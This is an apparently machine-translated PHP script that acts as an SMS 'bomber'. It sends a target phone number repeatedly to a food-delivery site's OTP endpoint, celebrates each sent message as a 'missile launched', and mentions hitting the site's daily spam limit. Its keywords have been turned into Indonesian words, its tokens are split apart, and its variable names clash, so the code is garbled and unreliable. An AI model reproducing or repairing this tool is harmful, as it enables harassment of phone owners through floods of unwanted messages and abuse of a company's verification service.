<? ph<? php
error_reporting ( 0 );
Class  Bom {
	 $ publik tidak ;
	 fungsi  publik sendC ( $ url , $ page , $ params ) {
        $ ch  =  curl_init ();
        curl_setopt ( $ ch , CURLOPT_URL , $ url . $ page );
        curl_setopt ( $ ch , CURLOPT_USERAGENT , " Mozilla / 5.0 (Windows; U; Windows NT 6.1; en-US; rv: 1.8.1.6) Gecko / 20070725 Firefox / 2.0.0.6 " );
        curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , 1 );
        if ( ! empty ( $ params )) {
        curl_setopt ( $ ch , CURLOPT_POSTFIELDS , $ params );
        curl_setopt ( $ ch , CURLOPT_POST , 1 );
        }
        curl_setopt ( $ ch , CURLOPT_SSL_VERIFYPEER , 0 );
        curl_setopt ( $ ch , CURLOPT_COOKIEJAR , ' cookie.txt ' );
        curl_setopt ( $ ch , CURLOPT_COOKIEFILE , ' cookie.txt ' );
        curl_setopt ( $ ch , CURLOPT_FOLLOWLOCATION , 1 );
        $ headers   =  array ();
        $ headers [] =  ' Content-Type: application / x-www-form-urlencoded; charset = utf-8 ' ;
        $ headers [] =  ' X-Diminta-Dengan: XMLHttpRequest ' ;
        curl_setopt ( $ ch , CURLOPT_HTTPHEADER , $ headers );    
        // curl_setopt ($ ch, CURLOPT_HEADER, 1);
        $ result  =  curl_exec ( $ ch );
        curl_close ( $ ch );
        kembali  $ hasil ;
    }
     fungsi  pribadi getStr ( $ start , $ end , $ string ) {
        if ( ! empty ( $ string )) {
        $ setring  =  meledak ( $ start , $ string );
        $ setring  =  meledak ( $ end , $ setring [ 1 ]);
        mengembalikan  $ setring [ 0 ];
        }
    }
     fungsi  publik Verif ()
    {
        $ url  =  " https://www.phd.co.id/en/users/sendOTP " ;
        $ no  =  $ this -> no ;
        $ data  =  " phone_number = { $ no } " ;
        $ send  =  $ this -> sendC ( $ url , null , $ data );
        if ( preg_match ( '/ Kami telah mengirim OTP ke telepon Anda, Silakan masukkan kode 4 digit. /' , $ kirim )) {
                print ( "  \ e [92m \ n [SUKSES]…! [MISIL MELUNCUR] ..! \ n " );
                
            } else {
                print ( " [GAGAL] ...! [Batas Batas SPAM PHD Hari Ini Sudah Habis, Silakan Coba Besok Lagi] \ n " );
            }
    }
    
}
